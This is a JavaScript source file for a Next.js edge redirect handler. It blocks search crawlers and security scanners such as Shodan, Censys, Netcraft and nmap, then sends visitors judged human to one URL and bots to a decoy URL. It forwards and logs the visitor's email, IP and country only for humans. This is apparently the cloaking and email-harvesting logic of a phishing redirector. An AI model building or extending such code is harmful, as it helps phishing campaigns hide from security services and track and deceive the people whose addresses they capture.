import { NextResponse } from 'next/server';
import { getRedirectConfig, classifyVisitor, logVisit } from '@/lib/mainApi';
import { extractEmailsFromURL, extractParametersAfterRedirectId, stripEmailsFromParams, appendParametersToURL } from '@/lib/emailAutograb';
import { cacheGet, cacheSet } from '@/lib/cache';

// Known crawler/bot user agents to block completely
const CRAWLER_PATTERNS = [
  /googlebot/i,
  /bingbot/i,
  /slurp/i,          // Yahoo
  /duckduckbot/i,
  /baiduspider/i,
  /yandexbot/i,
  /sogou/i,
  /exabot/i,
  /facebot/i,        // Facebook
  /ia_archiver/i,    // Alexa
  /msnbot/i,
  /teoma/i,
  /semrushbot/i,
  /ahrefsbot/i,
  /mj12bot/i,
  /dotbot/i,
  /rogerbot/i,
  /serpstatbot/i,
  /screaming frog/i,
  /archive\.org_bot/i,
  /petalbot/i,
  /crawler/i,
  /spider/i,
  /scraper/i,
  /bot\.htm/i,
  /bot\.php/i,
  /netcraftsurvey/i,
  /censys/i,
  /shodan/i,
  /masscan/i,
  /nmap/i
];

/**
 * Main redirect handler
 * Handles: /r/abc123 or /r/abc123$email@test.com
 */
export async function GET(request, { params }) {
  const { id } = params;
  const fullUrl = request.url;
  const fullPath = new URL(fullUrl).pathname + new URL(fullUrl).search;
  
  console.log(`[REDIRECT] Request for: ${id}`);
  
  try {
    // Extract actual redirect ID (before $ or *)
    const actualId = id.split(/[\$\*]/)[0];
    console.log(`[REDIRECT] Actual ID: ${actualId}`);
    
    // Get visitor info
    const ip = request.headers.get('x-forwarded-for') || 
               request.headers.get('x-real-ip') || 
               'unknown';
    const userAgent = request.headers.get('user-agent') || '';
    
    console.log(`[REDIRECT] Visitor IP: ${ip}`);
    
    // BLOCK CRAWLERS IMMEDIATELY - Before any processing
    const isCrawler = CRAWLER_PATTERNS.some(pattern => pattern.test(userAgent));
    if (isCrawler) {
      console.log(`[BLOCK-CRAWLER] Detected crawler - IP: ${ip}, UA: ${userAgent.substring(0, 100)}`);
      return new NextResponse('Access Denied: Crawlers not allowed', { 
        status: 403,
        headers: {
          'X-Robots-Tag': 'noindex, nofollow, noarchive, nosnippet',
        }
      });
    }
    
    // Check cache first (5-minute TTL)
    let redirectConfig = cacheGet(`redirect:${actualId}`);
    
    if (!redirectConfig) {
      console.log(`[REDIRECT] Cache miss - fetching from main API`);
      // Fetch from main API
      redirectConfig = await getRedirectConfig(actualId);
      // Cache for 5 minutes
      cacheSet(`redirect:${actualId}`, redirectConfig, 300);
    } else {
      console.log(`[REDIRECT] Cache hit`);
    }
    
    // Classify visitor (human or bot)
    const classification = await classifyVisitor(ip, userAgent);
    
    // Block visitors that were rejected by the classification system
    if (classification.classification === 'blocked') {
      console.log(`[REDIRECT] BLOCKED - ${classification.reason}`);
      return new NextResponse('Access Denied: Invalid request', { status: 403 });
    }
    
    const isHuman = classification.classification === 'human';
    
    console.log(`[REDIRECT] Classification: ${classification.classification}`);
    
    // Extract parameters after redirect ID
    const paramsAfterRedirectId = extractParametersAfterRedirectId(fullPath, actualId);
    
    // Extract emails from URL
    const emails = extractEmailsFromURL(fullUrl);
    const email = emails.length > 0 ? emails[0] : null;
    
    if (email) {
      console.log(`[REDIRECT] Email found: ${email}`);
    }
    
    // Determine final parameters and destination
    let finalParams = paramsAfterRedirectId;
    let destinationUrl;
    
    if (isHuman) {
      // HUMAN: Forward ALL parameters including email
      destinationUrl = redirectConfig.humanUrl;
      console.log(`[REDIRECT] HUMAN - forwarding all params`);
    } else {
      // BOT: Strip email parameters
      finalParams = stripEmailsFromParams(paramsAfterRedirectId);
      destinationUrl = redirectConfig.botUrl;
      console.log(`[REDIRECT] BOT - stripping email params`);
    }
    
    // Append parameters to destination
    const finalUrl = appendParametersToURL(destinationUrl, finalParams);
    
    console.log(`[REDIRECT] Final URL: ${finalUrl}`);
    
    // Log visit to main system (async, don't wait)
    logVisit({
      redirectId: redirectConfig.id,
      ip,
      userAgent,
      classification: classification.classification,
      email: isHuman ? email : null,
      country: request.geo?.country || 'Unknown',
      timestamp: new Date().toISOString(),
      source_url: fullUrl
    }).catch(err => console.error('[REDIRECT] Failed to log visit:', err));
    
    // Perform redirect with anti-crawler headers
    const response = NextResponse.redirect(finalUrl, 302);
    response.headers.set('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet');
    response.headers.set('Cache-Control', 'no-cache, no-store, must-revalidate');
    return response;
    
  } catch (error) {
    console.error('[REDIRECT] Error:', error.message);
    
    // Handle specific errors
    if (error.message === 'REDIRECT_NOT_FOUND') {
      return NextResponse.json({ 
        error: 'Redirect not found',
        message: 'This redirect link does not exist or has been deleted.'
      }, { status: 404 });
    }
    
    if (error.message === 'REDIRECT_INACTIVE') {
      return NextResponse.json({ 
        error: 'Redirect inactive',
        message: 'This redirect link has been deactivated.'
      }, { status: 410 });
    }
    
    // Generic error - redirect to main system as fallback
    const fallbackUrl = process.env.MAIN_API_URL?.replace('/api', '') || 'https://example.com';
    console.log(`[REDIRECT] Fallback to: ${fallbackUrl}`);
    return NextResponse.redirect(fallbackUrl, 302);
  }
}

// Export runtime config for Edge
export const runtime = 'edge';

